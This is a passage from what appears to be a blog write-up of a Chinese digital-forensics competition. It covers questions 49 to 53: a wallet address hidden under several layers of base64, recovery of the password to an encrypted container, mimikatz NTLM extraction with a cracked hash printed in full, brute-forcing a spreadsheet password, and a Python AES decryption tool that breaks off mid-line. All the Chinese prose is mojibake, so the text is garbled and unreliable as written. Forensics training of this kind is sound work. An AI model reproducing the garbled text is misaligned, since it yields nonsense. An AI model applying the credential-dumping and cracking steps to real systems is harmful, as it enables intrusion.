title="49ã€"></a>49ã€</h5><p>ç”¨æˆ·åˆ›å»ºå­˜å‚¨è™šæ‹Ÿå¸é’±åŒ…åœ°å€é¡µé¢çš„æ—¶é—´æ˜¯ï¼Ÿï¼ˆä½¿ç”¨åŒä½æ•°æ ¼å¼ï¼Œç­”æ¡ˆæ ¼å¼ï¼š01æœˆ01æ—¥ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>anytypeæ˜¯ç›¸å½“äºè®°äº‹æœ¬çš„ä¸œè¥¿ï¼Œè¿™é‡Œç›´æ¥å¯ä»¥æ‰“å¼€å¯ä»¥çœ‹åˆ°ç›¸å…³ä¿¡æ¯<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105155311479.png" alt="image-20251105155311479"></p><p>10æœˆ07æ—¥</p><h5 id="50ã€"><a href="#50ã€" class="headerlink" title="50ã€"></a>50ã€</h5><p>ç”¨æˆ·çš„è™šæ‹Ÿå¸é’±åŒ…åœ°å€æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæŒ‰ç…§å®é™…æƒ…å†µå¡«å†™ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>VkZSQ2IyVldjRWxSYkdoVlZrZG9hRmt5ZEV0V01sSTJZa1JXYTFaSGFIaGFWVkpIVlRKSmQwNVZPVlJsYkhCRVZqSTFiMDB5VFhkaFIzUlFWVlF3T1E9PQ==</p><p>å››æ¬¡base64å³å¯ï¼Œ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105155442523.png" alt="image-20251105155442523"></p><h5 id="51ã€"><a href="#51ã€" class="headerlink" title="51ã€"></a>51ã€</h5><p>ç”¨æˆ·VCåŠ å¯†å®¹å™¨çš„å¯†ç æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæŒ‰ç…§å®é™…æƒ…å†µå¡«å†™ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ</p><p>è§£å¯†è½¯ä»¶çš„æ—¶å€™ä¼šæŠ¥<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105173356004.png" alt="image-20251105173356004"></p><p>è‚¯å®šæ˜¯è¿˜æœ‰ç¢ç‰‡ï¼Œ5åœ¨ç”¨æˆ·2ä¸Šï¼Œç™»ä¸ä¸Šå»ï¼Ÿç›´æ¥æä¹Ÿå¯ä»¥  ï¼Œå…¬å¸èµ„æ–™é‡Œç»™äº†å¯†ç </p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105162028035.png" alt="image-20251105162028035"></p><p>è½¯ä»¶4æ­»æ´»æä¸å‡ºæ¥ï¼Œæœ€ååˆ†æå‘ç°<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105172807227.png" alt="image-20251105172807227"></p><p>å…¶å®è¿˜æ˜¯åœ¨æœºå™¨ä¸Šçš„ï¼Œæˆ‘ä»¬åˆ†æå…¬å¸èµ„æ–™é‡Œçš„æ–‡ä»¶</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105172908483.png" alt="image-20251105172908483"></p><p>å…¶å®æ˜¯æœ‰å¯†ç çš„ï¼Œåœ¨ç”¨æˆ·1é‡Œé¢å‘ç°part4åœ¨åƒåœ¾æ¡¶é‡Œï¼Œè£‚å¼€</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105172832368.png" alt="image-20251105172832368"></p><p>ä»€ä¹ˆ  ä½ è¯´mimikatzéƒ½æŠ“å‡ºntlmäº†ï¼Œç›´æ¥è§£ä¸å°±å¯ä»¥äº†ï¼Œæ˜¾ç„¶<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251105173052091.png" alt="image-20251105173052091"></p><p>æ²¡é’±å¯¸æ­¥éš¾è¡Œã€‚</p><p>æ²¡äº‹ è®°ä¸€ä¸‹ï¼Œf37055ca991018adfcc9cfedcfe39e58:2025szb</p><p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106095849165.png" alt="image-20251106095849165"></p><p>åˆ°è¿™é‡Œä½ ä¼šå‘ç°ï¼Œè¿˜æ˜¯æå–ä¸äº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œä»”ç»†çœ‹ï¼Œè¿™é‡Œä½ ä¼šå‘ç°part4ä¸ºzipï¼Œä½†æ˜¯æ‰€æœ‰çš„å…¶ä»–partéƒ½æ˜¯rarï¼Œä¸”åˆ‡ç‰‡å¤§å°ä¹Ÿä¸ä¸€æ ·ï¼Œæœ‰å¯èƒ½éœ€è¦è§£å‹ç¼©å•¥çš„ï¼Œæˆ–è€…éšå†™ä¹ˆï¼Œç¬”è€…è¿™é‡Œå°è¯•äº†éƒ½ï¼Œå‘ç°è¿˜æ˜¯ä¸å¯¹ï¼Œé‚£ä¹ˆè¿˜æ˜¯å›åˆ°æœºå™¨é‡Œï¼Œè¿™ä¸ªå¯èƒ½æ˜¯å‡çš„ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬ç›´æ¥ä¸‹è½½ä¸€ä¸ªeverything æœ<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106102957688.png" alt="image-20251106102957688"></p><p>ç»ˆäºåœ¨è¿™ä¸ªè·¯å¾„å‘ç°äº†ï¼Œåˆ°è¿™é‡Œäº”ä¸ªåˆ†ç‰‡ä¹Ÿå°±æ‰¾åˆ°äº†ï¼Œç›´æ¥è§£å‹å³å¯ã€‚è¿™ä¸ªè·¯å¾„æ˜¯ <strong>VMware çš„æ‹–æ”¾ï¼ˆDrag and Dropï¼‰ä¸´æ—¶æ–‡ä»¶å¤¹</strong> è·¯å¾„ã€‚ä¹Ÿå°±æ˜¯è¯´part4æœ‰ä¸€ä¸ªæ˜¯å‡çš„ï¼Œè¿™ä¸ªè·¯å¾„çš„ä¸ºçœŸã€‚è§£å‹å‡ºæ¥ä¸ºä¸€ä¸ªdocxå’Œdecrypto.exeï¼Œç”¨è¿™ä¸ªexeè§£docxæŠ¥é”™ï¼Œç›´æ¥æ‰“å¼€docxå³å¯ï¼Œå¾€ä¸‹æ‹–æ–‡ç« æœ‰ä¸€ä¸ªç©ºé¡µï¼Œç»å…¸miscéšå†™ï¼Œç™½è‰²å­—ä½“ï¼Œè½¬æˆå…¶ä»–é¢œè‰²å³å¯ã€‚<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106103838787.png" alt="image-20251106103838787"></p><h5 id="52ã€"><a href="#52ã€" class="headerlink" title="52ã€"></a>52ã€</h5><p>ç”¨æˆ·åœ¨ç”Ÿæ´»ä¸­ä½¿ç”¨çš„ä»£å·æ˜¯ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæŒ‰ç…§å®é™…æƒ…å†µå¡«å†™ï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br>æ¡Œé¢ä¸Šå°±æœ‰ä¸ªä»£å·ï¼Œä½†æ˜¯å¬ä¸å‡ºæ¥ä»€ä¹ˆï¼Œç›´æ¥æ‹–åˆ°aué‡Œçœ‹é¢‘è°±å›¾å³å¯ï¼Œç»å…¸éŸ³é¢‘æ‚é¡¹<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106104427153.png" alt="image-20251106104427153"></p><h5 id="53ã€"><a href="#53ã€" class="headerlink" title="53ã€"></a>53ã€</h5><p>æå®‰ä¸œçš„é“¶è¡Œå¡å½’å±å“ªä¸ªé“¶è¡Œï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šå†œä¸šé“¶è¡Œï¼‰ï¼ˆ ï¼‰<br>è€ƒç”Ÿç­”æ¡ˆï¼š<br>è¯·è¾“å…¥ç­”æ¡ˆ<br><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106104537075.png" alt="image-20251106104537075">å…¬å¸èµ„æ–™é‡Œæœ‰é“¶è¡Œå¡å¯†ç ï¼Œç»™äº†æç¤ºï¼Œéœ€è¦çˆ†ç ´6ä½æ•°å­—<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106112538410.png" alt="image-20251106112538410"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°çˆ†ç ´è¿™ä¸ªå¯†ç 100wçš„xlsxå¯†ç éœ€è¦5ä¸ªå°æ—¶ä¹‹å¤šï¼Œè€Œæ¯”èµ›æ€»å…±çš„æ—¶é—´ä¹Ÿå°±äº”ä¸ªå°æ—¶ï¼Œæ‰€ä»¥è¿˜æ˜¯æ„Ÿè§‰çˆ†ç ´æ˜¯ä¸å¯èƒ½çš„ï¼Œé‚£ä¹ˆç¬”è€…è¿™é‡Œç ”ç©¶ï¼Œåˆšåˆšè§£å¼€çš„çš„parté‡Œé¢æœ‰ä¸€ä¸ªç¨‹åºæ²¡æœ‰ç”¨åˆ°ï¼Œä½†æ˜¯æ˜¯ä¸€ä¸ªè§£å¯†çš„æ–‡ä»¶ï¼Œåˆšå¥½æ˜¯å¯ä»¥è§£å¯†çš„<img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%95%B0%E8%AF%81%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E8%B5%9B/image-20251106143129583.png" alt="image-20251106143129583"></p><p>ä½†æ˜¯ è§£å‡ºæ¥åæ‰“å¼€ä¹±ç ï¼Œæ˜¯ä¸€ä¸ªdecçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±çœ‹çœ‹è¿™ä¸ªexeæœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ç”¨åˆ°çš„ï¼Œä¸€çœ‹å°±æ˜¯pythonçš„exeï¼Œè§£å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> filedialog, messagebox</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecryptionToolDebug</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._generate_key()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_log</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(*args)  <span class="comment"># æ§åˆ¶å°æ‰“å°</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate_key</span>(<span class="params">self</span>):</span></span><br><span class="line">        seed_values = [(<span class="number">19</span>, <span class="number">7</span>, <span class="number">83</span>), (<span class="number">5</span>, <span class="number">31</span>, <span class="number">69</span>), (<span class="number">13</span>, <span class="number">11</span>, <span class="number">86</span>), (<span class="number">41</span>, <span class="number">3</span>, <span class="number">76</span>),</span><br><span class="line">                       (<span class="number">2</span>, <span class="number">57</span>, <span class="number">55</span>), (<span class="number">23</span>, <span class="number">5</span>, <span class="number">96</span>), (<span class="number">17</span>, <span class="number">13</span>, <span class="number">58</span>), (<span class="number">29</span>, <span class="number">7</span>, <span class="number">94</span>),</span><br><span class="line">                       (<span class="number">11</span>, <span class="number">19</span>, <span class="number">102</span>), (<span class="number">7</span>, <span class="number">17</span>, <span class="number">42</span>), (<span class="number">43</span>, <span class="number">3</span>, <span class="number">48</span>), (<span class="number">37</span>, <span class="number">11</span>, <span class="number">51</span>),</span><br><span class="line">                       (<span class="number">3</span>, <span class="number">43</span>, <span class="number">52</span>), (<span class="number">59</span>, <span class="number">7</span>, <span class="number">53</span>), (<span class="number">47</span>, <span class="number">5</span>, <span class="number">54</span>)]</span><br><span class="line">        key_parts = []</span><br><span class="line">        <span class="keyword">for</span> idx, (a, b, base) <span class="keyword">in</span> <span class="built_in">enumerate</span>(seed_values):</span><br><span class="line">            val = (a * b % <span class="number">60</span> + base) % <span class="number">256</span></span><br><span class="line">            val = (val + <span class="number">13</span>) % <span class="number">256</span> <span class="keyword">if</span> val % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> (val + <span class="number">7</span>) % <span class="number">256</span></span><br><span class="line">            key_parts.append(<span class="built_in">chr</span>(val))</span><br><span class="line">            self._log(<span class="string">f&quot;[_generate_key] idx=<span class="subst">&#123;idx&#125;</span> a=<span class="subst">&#123;a&#125;</span> b=<span class="subst">&#123;b&#125;</span> base=<span class="subst">&#123;base&#125;</span> val=<span class="subst">&#123;val&#125;</span> char=<span class="subst">&#123;<span class="built_in">repr</span>(<span class="built_in">chr</span>(val))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        indices = [<span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">        scrambled = [key_parts[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices]</span><br><span class="line">        raw_key = <span class="string">&#x27;&#x27;</span>.join(scrambled)</span><br><span class="line">        self._log(<span class="string">&quot;[_generate_key] scrambled chars:&quot;</span>, scrambled)</span><br><span class="line">        self._log(<span class="string">&quot;[_generate_key] raw_key:&quot;</span>, <span class="built_in">repr</span>(raw_key))</span><br><span class="line"></span><br><span class="line">        timestamp = <span class="built_in">int</span>(time.time()) % <span class="number">1000</span></span><br><span class="line">        random_val = random.randint(<span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">        entropy = <span class="built_in">chr</span>(timestamp % <span class="number">256</span>) + <span class="built_in">chr</span>(random_val)</span><br><span class="line">        self._log(<span class="string">&quot;[_generate_key] timestamp:&quot;</span>, timestamp, <span class="string">&quot;random_val:&quot;</span>, random_val, <span class="string">&quot;entropy:&quot;</span>, <span class="built_in">repr</span>(entropy))</span><br><span class="line"></span><br><span class="line">        temp_key = hashlib.sha256((raw_key + entropy).encode()).digest()</span><br><span class="line">        self._log(<span class="string">&quot;[_generate_key] temp_key sha256:&quot;</span>, temp_key.<span class="built_in">hex</span>())</span><br><span class="line">        self._descramble_key(temp_key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_descramble_key</span>(<span class="params">self, temp_key</span>):</span></span><br><span class="line">        mixed_base = <span class="string">b&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>([b ^ <span class="number">42</span>]) <span class="keyword">for</span> b <span class="keyword">in</span> temp_key[:<span class="number">10</span>]])</span><br><span class="line">        self._log(<span class="string">&quot;[_descramble_key] mixed_base:&quot;</span>, mixed_base.<span class="built_in">hex</span>())</span><br><span class="line">        actual_key = <span class="string">&#x27;SecureKey123456&#x27;</span></span><br><span class="line">        self._log(<span class="string">&quot;[_descramble_key] actual_key:&quot;</span>, actual_key)</span><br><span class="line">        self.enhanced_key = self.enhance_key(actual_key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enhance_key</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self._log(<span class="string">&quot;[enhance_key] input key:&quot;</span>, <span class="built_in">repr</span>(key))</span><br><span class="line">        round1 = self._add_salt(key)</span><br><span class="line">        self._log(<span class="string">&quot;[enhance_key] round1 (_add_salt):&quot;</span>, <span class="built_in">repr</span>(round1))</span><br><span class="line">        round2 = self._ascii_transform(round1)</span><br><span class="line">        self._log(<span class="string">&quot;[enhance_key] round2 (_ascii_transform):&quot;</span>, <span class="built_in">repr</span>(round2))</span><br><span class="line">        round3 = self._xor_transform(round2)</span><br><span class="line">        self._log(<span class="string">&quot;[enhance_key] round3 (_xor_transform):&quot;</span>, <span class="built_in">repr</span>(round3))</span><br><span class="line">        round4 = round3[::-<span class="number">1</span>]</span><br><span class="line">        self._log(<span class="string">&quot;[enhance_key] round4 (reversed):&quot;</span>, <span class="built_in">repr</span>(round4))</span><br><span class="line">        final_key = hashlib.md5(round4.encode()).digest()</span><br><span class="line">        self._log(<span class="string">&quot;[enhance_key] final_key md5:&quot;</span>, final_key.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">return</span> final_key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_add_salt</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        <span class="keyword">return</span> key + <span class="string">&#x27;salt_value&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_ascii_transform</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(text):</span><br><span class="line">            ascii_val = <span class="built_in">ord</span>(ch)</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                new_val = (ascii_val + <span class="number">7</span>) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">                new_val = (ascii_val ^ <span class="number">15</span>) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                new_val = (ascii_val * <span class="number">5</span>) % <span class="number">256</span></span><br><span class="line">            result += <span class="built_in">chr</span>(new_val)</span><br><span class="line">            self._log(<span class="string">f&quot;[_ascii_transform] i=<span class="subst">&#123;i&#125;</span> orig=<span class="subst">&#123;ascii_val&#125;</span> new=<span class="subst">&#123;new_val&#125;</span> char=<span class="subst">&#123;<span class="built_in">repr</span>(<span class="built_in">chr</span>(new_val))&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_xor_transform</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        xor_keys = [<span class="string">&#x27;XorKey123456789&#x27;</span>, <span class="string">&#x27;AnotherKey987654&#x27;</span>]</span><br><span class="line">        result = text</span><br><span class="line">        <span class="keyword">for</span> ridx, xor_key <span class="keyword">in</span> <span class="built_in">enumerate</span>(xor_keys):</span><br><span class="line">            temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">                new_val = <span class="built_in">ord</span>(ch) ^ <span class="built_in">ord</span>(xor_key[i % <span class="built_in">len</span>(xor_key)])</span><br><span class="line">                temp += <span class="built_in">chr</span>(new_val)</span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">5</span>:</span><br><span class="line">                    self._log(<span class="string">f&quot;[_xor_transform] round=<span class="subst">&#123;ridx&#125;</span> i=<span class="subst">&#123;i&#125;</span> new_val=<span class="subst">&#123;new_val&#125;</span> char=<span class="subst">&#123;<span class="built_in">repr</span>(<span class="built_in">chr</span>(new_val))&#125;</span>&quot;</span>)</span><br><span class="line">            result = temp</span><br><span class="line">            self._log(<span class="string">f&quot;[_xor_transform] after round <span class="subst">&#123;ridx&#125;</span> sample ords:&quot;</span>, [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> result[:<span class="number">10</span>]])</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unpad_data</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        padding_length = data[-<span class="number">1</span>]</span><br><span class="line">        self._log(<span class="string">&quot;[unpad_data] padding_length:&quot;</span>, padding_length)</span><br><span class="line">        <span class="keyword">return</span> data[:-padding_length]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_file</span>(<span class="params">self, input_file, output_file=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> output_file:</span><br><span class="line">            output_file = input_file[:-<span class="number">4</span>] <span class="keyword">if</span> input_file.endswith(<span class="string">&#x27;.enc&#x27;</span>) <span class="keyword">else</span> input_file + <span class="string">&#x27;.dec&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                file_data = f.read()</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] input_file:&quot;</span>, input_file, <span class="string">&quot;len:&quot;</span>, <span class="built_in">len</span>(file_data))</span><br><span class="line">            iv = file_data[:<span class="number">16</span>]</span><br><span class="line">            encrypted_data = file_data[<span class="number">16</span>:]</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] iv:&quot;</span>, iv.<span class="built_in">hex</span>())</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] encrypted_data sample (first 64 bytes):&quot;</span>, encrypted_data[:<span class="number">64</span>].<span class="built_in">hex</span>())</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] enhanced_key:&quot;</span>, self.enhanced_key.<span class="built_in">hex</span>())</span><br><span class="line">            cipher = AES.new(self.enhanced_key, AES.MODE_CBC, iv=iv)</span><br><span class="line">            decrypted_padded = cipher.decrypt(encrypted_data)</span><br><span class="line">            self._log(<span class="string">&quot;[decrypt_file] decrypted_padded sample:&quot;</span>, decrypted_padded[:<span class="number">128</span>].<span 